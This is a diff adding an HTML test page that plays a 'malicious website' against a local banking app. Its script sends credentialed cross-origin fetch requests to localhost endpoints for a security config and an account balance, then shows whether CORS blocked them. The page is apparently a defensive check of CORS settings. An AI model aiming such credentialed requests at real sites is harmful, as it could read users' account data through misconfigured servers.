@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Attack Test - Malicious Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 { color: #d32f2f; }
+        .status {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        .success {
+            background: #ffebee;
+            border: 2px solid #d32f2f;
+            color: #d32f2f;
+        }
+        .blocked {
+            background: #e8f5e9;
+            border: 2px solid #4caf50;
+            color: #4caf50;
+        }
+        pre {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        button {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        button:hover {
+            background: #b71c1c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1> Malicious Website - CORS Attack Simulation</h1>
+        <p><strong>This page simulates a malicious website trying to steal data from your banking app.</strong></p>
+        <p>Origin: <code id="origin"></code></p>
+
+        <hr>
+
+        <h2>Attack 1: Steal Security Config</h2>
+        <button onclick="attackSecurityConfig()">Launch Attack on /api/security-config</button>
+        <div id="result1"></div>
+
+        <h2>Attack 2: Steal Balance</h2>
+        <button onclick="attackBalance()">Launch Attack on /check_balance/ACC1001</button>
+        <div id="result2"></div>
+
+    </div>
+
+    <script>
+        // Show current origin
+        document.getElementById('origin').textContent = window.location.origin;
+
+        function attackSecurityConfig() {
+            const resultDiv = document.getElementById('result1');
+            resultDiv.innerHTML = '<div class="status">⏳ Attacking /api/security-config...</div>';
+
+            fetch('http://localhost:5000/api/security-config', {
+                credentials: 'include'
+            })
+            .then(response => {
+                console.log('Attack 1 Response:', response);
+                return response.json();
+            })
+            .then(data => {
+                console.log('Attack 1 Success! Stolen data:', data);
+                resultDiv.innerHTML = `
+                    <div class="status success">
+                        <strong>⚠️ ATTACK SUCCEEDED!</strong><br>
+                        Data was stolen from a cross-origin request!<br>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    </div>
+                `;
+            })
+            .catch(error => {
+                console.log('Attack 1 Blocked:', error);
+                resultDiv.innerHTML = `
+                    <div class="status blocked">
+                        <strong>✓ ATTACK BLOCKED BY CORS!</strong><br>
+                        Error: ${error.message}<br>
+                        Check console (F12) for CORS error details.
+                    </div>
+                `;
+            });
+        }
+
+        function attackBalance() {
+            const resultDiv = document.getElementById('result2');
+            resultDiv.innerHTML = '<div class="status">⏳ Attacking /check_balance/ACC1001...</div>';
+
+            fetch('http://localhost:5000/check_balance/ACC1001', {
+                credentials: 'include',
+                headers: {
+                    'Authorization': 'Bearer fake-token'
+                }
+            })
+            .then(response => {
+                console.log('Attack 2 Response:', response);
+                return response.json();
+            })
+            .then(data => {
+                console.log('Attack 2 Success! Stolen data:', data);
+                resultDiv.innerHTML = `
+                    <div class="status success">
+                        <strong>⚠️ ATTACK SUCCEEDED!</strong><br>
+                        Balance data was stolen from cross-origin request!<br>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    </div>
+                `;
+            })
+            .catch(error => {
+                console.log('Attack 2 Blocked:', error);
+                resultDiv.innerHTML = `
+                    <div class="status blocked">
+                        <strong>✓ ATTACK BLOCKED BY CORS!</strong><br>
+                        Error: ${error.message}<br>
+                        CORS protection is active.
+                    </div>
+                `;
+            });
+        }
+    </script>
+</body>
+</html>
